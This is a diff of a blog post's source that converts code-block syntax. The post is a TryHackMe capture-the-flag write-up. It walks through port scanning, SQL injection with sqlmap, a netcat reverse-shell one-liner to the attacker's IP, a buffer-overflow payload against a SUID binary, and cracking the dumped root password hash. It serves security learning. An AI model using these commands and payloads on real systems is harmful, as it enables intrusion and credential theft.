@@ -9,9 +9,9 @@ I Recently solved my first exploitable machine ever and decided to write about i
 
 # *Scanning the target*
 I started with a simple port scan. I used nmap to do this by running the command:
-{% highlight bash %}
+```bash
 nmap -sV -sC -vv -p-1000 $IP
-{% endhighlight %}
+```
 Nmap is a tool that allows you to scan a target for services by sending packets to every port and listening for a response. In this case i run it with some additional flags:
 ```
 -sV #This performs additional scans to enumerete the versions
@@ -43,9 +43,9 @@ As we see, we have a webpage and a ssh server, both on their default ports `80` 
 # *Directory Listing*
 It's time to do a directory listing by basically brute-forcing directory names and hope to find something interesting on the server. I use a tool named [gobuster](https://github.com/OJ/gobuster) to do this. To perform such scans we need a wordlist of all possible directories, mine come from [here](https://github.com/danielmiessler/SecLists).
 This time I run 
-{% highlight bash %}
+```bash
 gobuster dir --url $IP --wordlist directory-list-2.3-big.txt -x php
-{% endhighlight %}
+```
 `url` and `wordlist` flag are needed to specify the target and the wordlist while the `x` flag is used to search for php files (By appending `.php` to the words). The scan reveals three files `.htaccess`,`.htpasswd` and `administrator.php`.
 The first two are default Apache files and give a 403 error when visited(Permission Denied), nothing for us. The third one instead, sound interesting, so let's take a look.
 
@@ -58,9 +58,9 @@ A login form, Nice! Default credentials like `admin` don't take us anywhere, so 
 The webpage displays SQL Errors so Error Based injection is also possible. Using `' UNION SELECT NULL, NULL from test# ` gives an error while `' UNION SELECT NULL, NULL from users# ` doesn't. That's how I found out a `users` table exists with fields `username` and `password`. I tried other payloads to get more info about the database but at the end I switched to [sqlmap](http://sqlmap.org/). 
 
 This python-based tool allows you to automatically test and exploit sql injection vulnerabilities. On command line:
-{% highlight bash %}
+```bash
 python sqlmap.py -u http://10.10.96.193/administrator.php --forms --batch -T users --dump
-{% endhighlight %}
+```
 Let's see what's going on here:
 ```
 -u #Specifies the target
@@ -91,9 +91,9 @@ Can we actually run commands? Let's try...
 
 Nice!
 So let's try to get a reverse shell. First we set up a simple tcp server on our pc by using [netcat](https://en.wikipedia.org/wiki/Netcat). The following will do the job:
-{% highlight bash %}
+```bash
 nc -nvlp 1999
-{% endhighlight %}
+```
 ```
 -n #Ignores dns lookup
 -l #Listens
@@ -102,26 +102,26 @@ nc -nvlp 1999
 
 ```
 Now we want the server to connect to our host on port 1999 by running some command on the server. There are multiple ways to archive this, and I tested more then one. I end up using:
-{% highlight bash %}
+```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $YOUR_IP 1999 >/tmp/f
-{% endhighlight %}
+```
 Here we are simply running netcat with some stdin stdout redirection magic. You can read more about how this reverse shell works [here](https://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498).
 If we run the above command and look at our terminal, we recive a connection and get a Shell!
 ![terminal](/assets/CodCaper_Terminal.png)
 (Obviously you will recive it from $IP)
 The box asks us to find a password on the machine (Remember the SSH server?), i simply run
-{% highlight bash %}
+```bash
 find / -user www-data 2>/dev/null
-{% endhighlight %}
+```
 This gives us all files owned by `www-data` (our current user). A file stands out: `/var/hidden/pass`. Inspecting it actually revealed a password: `pinguapingu`. I also found a private RSA key, but It did't work for me, so will ignore it.
 
 # *Enumeration*
 Let's ssh into the box. There is a user called `pingu` onto witch we can login with the password we just found.
 ![SSH](/assets/CodCaper_SSH.png)
 Now it's time for some enumeration. There is a really good bash script [LinEnum.sh](https://github.com/rebootuser/LinEnum) that will automate this process. It gives us a lot of infos about the box and can find some pretty interesting stuff. First of all we need to get the script on the box. Obiously we could just copy-paste, but it's not very practical for long files like this. What I end up using was a simple http server. To do this, first we run this from inside the folder that contains the script:
-{% highlight bash %}
+```bash
 python -m http.server 9999
-{% endhighlight %}
+```
 Now we can wget this file from the server (Remember to use your ip instead)
 ![Upload](/assets/CodCaper_Upload.png)
 Let's run It and... we get a big big output. Let's save it to a file and inspect it closer. The section that contains someting interesting is the `SUID files` part. In particular, one executable stands out:
@@ -129,7 +129,7 @@ Let's run It and... we get a big big output. Let's save it to a file and inspect
 
 # *Exploitation*
 We can execute /opt/secret/root with root privileges, so maybe we can find a vulnerability in there and get arbitrary code execution. At This point, TryHackMe actually gives us the source code for this file so let's have a look.
-{% highlight c %}
+```c
 #include "unistd.h"
 #include "stdio.h"
 #include "stdlib.h"
@@ -147,7 +147,7 @@ scanf("%s",buffer);
 int main(){
 get_input();
 }
-{% endhighlight %}
+```
 On execution, the program waits for input, then puts it in a 32-byte long buffer and ...does nothing?. The binary also contais a shell function that is never called so we could try to redirect execution there to get the [shadow file](https://en.wikipedia.org/wiki/Passwd#Shadow_file). What happens if we try to feed the program more input than expected (more then 32 characters)?
 ![CodCaper_Overflow](/assets/CodCaper_Overflow.png)
 We trigger a Segmentation fault! At this point you will need to know some basic binary exploitation and buffer-overflows. By running gdb on the binary directly on the server we see that pwndbg is installed. I'm not used to this tool but it gave me some really nice output by just using commonn gdb instructions. After running the program with `run` and triggering the segmentation again with `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`, we get a lot of useful debug info. Let's take a look at the registers section.
@@ -158,9 +158,9 @@ Good News! Seems like we can write directly in the `EIP` registers, in other wor
 
 We see the function is located at `0x080484cb`. One way to archive our goal is to feed this adress multiple times as input to the program, at some point it will overwrite The `EIP` register with it. This way we don't have to calculate offsets.
 I used python to print raw bytes to the program's `stdin`. <br/> *Notice that the adress is written backwards because of [Little Endian](https://en.wikipedia.org/wiki/Endianness#Little-endian) architecture.*
-{% highlight bash %}
+```bash
 python -c "print(b'\xcb\x84\x04\x08'*15)" | /opt/secret/root
-{% endhighlight %}
+```
 And...
 ![Shadow](/assets/CodCaper_Shadow.png)
 ...We Actually get the Shadow file! We can clearly see the hashed root password: `$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.`
@@ -170,7 +170,7 @@ Looks intimidating!
 I don't like brute-forcing, but in this case the box want's us to do it, at least to give it a try. The hash looks very complicated but we have to notice some things first. The value `6` in between the first two `$` stands for the hash mode, `SHA512` in this case. The value of `rFK4s/vE` in between the second and the third `$` is the [salt](https://en.wikipedia.org/wiki/Salt_(cryptography)). I Used [Jhon the Ripper](https://github.com/magnumripper/JohnTheRipper) to test the hash against the rockyou.txt wordlist. (*I got the wordlist from the same collection used to bruteforce the directory*)
 I copied the first line of the shadow file we found in a temporary file called `thecod` and this is what i got:
 
-{% highlight bash linenos%}
+```bash
 ./john --wordlist=rockyou.txt thecod 
 Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
 Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
@@ -186,7 +186,7 @@ l*******h        (root)
 1g 0:00:01:05 DONE (2020-05-04 22:18) 0.01536g/s 3696p/s 3696c/s 3696C/s lucinha..lailaa
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
-{% endhighlight %}
+```
 The Password pops up at `Line 12`! *(Hidden on purpose)* <br/>
 If we try to log in...<br/>
 ![Root](/assets/CodCaper_Root.png)
